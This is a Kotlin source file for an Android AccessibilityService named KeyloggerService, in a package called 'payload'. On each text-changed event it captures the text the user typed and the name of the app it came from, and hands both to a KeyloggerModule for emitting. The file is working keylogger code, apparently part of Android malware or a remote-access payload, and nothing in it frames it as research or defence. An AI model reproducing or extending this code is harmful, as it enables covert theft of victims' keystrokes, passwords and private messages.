package com.ihk909.payload

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import com.ihk909.payload.modules.KeyloggerModule

class KeyloggerService : AccessibilityService() {
    override fun onServiceConnected() {
        super.onServiceConnected()
        KeyloggerModule.lastService = this
    }

    override fun onAccessibilityEvent(e: AccessibilityEvent?) {
        KeyloggerModule.lastService = this
        if (e == null || !KeyloggerModule.enabled(this)) return
        runCatching {
            if (e.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                val t = if (!e.text.isNullOrEmpty()) e.text[0] else ""
                KeyloggerModule.emit(t.toString(), e.packageName?.toString() ?: "")
            }
        }
    }

    override fun onInterrupt() {}
}